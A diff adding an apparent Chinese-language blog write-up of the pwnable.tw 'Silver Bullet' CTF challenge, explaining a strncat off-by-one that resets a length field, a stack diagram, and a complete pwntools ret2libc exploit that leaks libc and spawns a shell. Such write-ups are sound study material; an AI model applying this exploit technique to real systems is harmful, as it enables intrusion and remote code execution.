@@ -15,6 +15,72 @@
       </categories>
   </entry>
   <entry>
+    <title>Silver Bullet</title>
+    <url>/archives/941745fe.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-Silver-Bullet"><a href="#pwnable-tw-Silver-Bullet" class="headerlink" title="pwnable.tw - Silver Bullet"></a>pwnable.tw - Silver Bullet</h2><span id="more"></span>
+
+<hr>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看保护</p>
+<p><img src="https://i.loli.net/2021/07/26/8ABiG3jDKsftTvI.png"></p>
+<p>没有canary，好消息</p>
+<p>程序主要就三个函数：create_bullet()，power_up()，beat()</p>
+<h3 id="create-bullet"><a href="#create-bullet" class="headerlink" title="create_bullet()"></a>create_bullet()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="keyword">char</span> s[<span class="number">0x30</span>]; <span class="comment">// [esp+8h] [ebp-34h] BYREF</span></span><br><span class="line"><span class="comment">//create_bullet</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">create_bullet</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *s )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You have been created the Bullet !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your description of bullet :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x30</span>u);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your power is : %u\n&quot;</span>, v2);</span><br><span class="line">  *((_DWORD *)s + <span class="number">12</span>) = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Good luck !!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们输入的description字符串被放在了s数组中，而且输入最多0x30个字符；</p>
+<p>而输入的字符个数放在了<code>*((_DWORD *)s + 12)</code>，就在<code>[ebp-4]</code>的位置放了一个int，考虑到小端表示&amp;数字小于0x30，其实就是放在了s[0x30]</p>
+<p>其他也没什么特别的了，漏洞不在这</p>
+<h3 id="beat"><a href="#beat" class="headerlink" title="beat()"></a>beat()</h3><p>逻辑很简单，wolf有个血量，调用这个函数会把血量减去<code>*((_DWORD *)s + 12)</code>这个值，如果血量&lt;=0，就win</p>
+<p>没看出什么漏洞</p>
+<h3 id="power-up"><a href="#power-up" class="headerlink" title="power_up()"></a>power_up()</h3><p>啊哈，这个函数看起来很复杂，漏洞应该就在这了</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">power_up</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+0h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<div class="note danger"><p>这里要注意一下函数里的s不是main函数里的s，main函数的s是作为dest传进来的（也可以用快捷键n修改一下这些变量名</p>
+</div>
+
+<p>可以看到，这里是用<code>*((_DWORD *)dest + 12)</code>的值来控制我们输入的字符数，来防止栈溢出</p>
+<p>而且他用了<code>strncat</code>，看似很安全</p>
+<p><strong>但是<code>strncat</code>会在追加好之后在后面加一个<code>\x00</code></strong></p>
+<blockquote>
+<p>Appends the first <em>num</em> characters of <em>source</em> to <em>destination</em>, <strong>plus a terminating null-character</strong>.</p>
+<p>from <a href="https://www.cplusplus.com/reference/cstring/strncat/">https://www.cplusplus.com/reference/cstring/strncat/</a></p>
+</blockquote>
+<p>而<code>*((_DWORD *)dest + 12)</code>就在字符串的末尾后的一个字节（上文分析过），也就是说：</p>
+<p>如果power_up的时候，<code>len(dest) + len(s) = 0x30</code>，<code>*((_DWORD *)dest + 12)</code>的第一个字节就会被覆盖成<code>\x00</code>，然后<code>*((_DWORD *)dest + 12) = v3 = strlen(s)</code></p>
+<p>这样我们就可以栈溢出了：</p>
+<div class="note info"><p>如果create的时候写<code>0x2f</code>个字符，powerup时候写<code>1</code>个字符，</p>
+<p>那就可以再写<code>0x30 - 0x1 = 0x2f</code>个字符，绰绰有余</p>
+</div>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h3><p>在上述操作之后，栈上是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ebp-0x34       +--------------------+</span><br><span class="line">               |                    |</span><br><span class="line">               |     &#x27;a&#x27;*0x30       |</span><br><span class="line">               |                    |</span><br><span class="line">ebp-0x4        +--------------------+</span><br><span class="line">               |&#x27;\x01&#x27;|             | &lt;-- *((_DWORD *)dest + 12)</span><br><span class="line">               +--------------------+</span><br><span class="line">               |        ebp         |</span><br><span class="line">               +--------------------+</span><br><span class="line">               |      retaddr       |</span><br><span class="line">               +--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>我们再次power_up的话，就会写在那个<code>&#39;\x01&#39;</code>后面</p>
+<p>这里需要注意，我们布置好栈上数据之后要在main函数return才能触发，</p>
+<p>main函数中return的条件是beat成功，</p>
+<p>那么就要使<code>*((_DWORD *)dest + 12)</code>的值大于<code>0x7fffffff</code>，只需要在<code>&#39;\x01&#39;</code>后面放三个<code>&#39;\xff&#39;</code>就行，显然<code>0xffffff01 &gt; 0x7fffffff</code></p>
+<p>ebp就随便覆盖点什么就行</p>
+<h3 id="leak-libc-amp-getshell"><a href="#leak-libc-amp-getshell" class="headerlink" title="leak libc &amp; getshell"></a>leak libc &amp; getshell</h3><ul>
+<li><p>程序里有puts函数，那就把retaddr覆盖成puts的地址，参数写puts的got表地址（用puts把puts的真实地址打印出来</p>
+<p>返回地址就写main函数</p>
+</li>
+<li><p>然后再来一遍，这次把retaddr覆盖成libc中system的地址，参数在libc中找一个’/bin/sh’的地址，返回地址随便写</p>
+</li>
+</ul>
+<p><em><strong>Bingo</strong></em> ~~~</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./silver_bullet&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./silver_bullet&quot;)</span></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10103</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">data</span>):</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span>():</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\xff&#x27;</span>*<span class="number">3</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">power(payload)</span><br><span class="line">beat()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;win !!\n&#x27;</span>)</span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\xff&#x27;</span>*<span class="number">3</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeaf</span>) + p32(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())</span><br><span class="line">power(payload)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://bbs.pediy.com/thread-259408.htm">https://bbs.pediy.com/thread-259408.htm</a></p>
+<p><a href="https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/">https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/</a></p>
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+      <tags>
+        <tag>stackoverflow</tag>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hacknote</title>
     <url>/archives/c5963d96.html</url>
     <content><![CDATA[<h2 id="pwnable-tw-hacknote"><a href="#pwnable-tw-hacknote" class="headerlink" title="pwnable.tw - hacknote"></a>pwnable.tw - hacknote</h2><span id="more"></span>
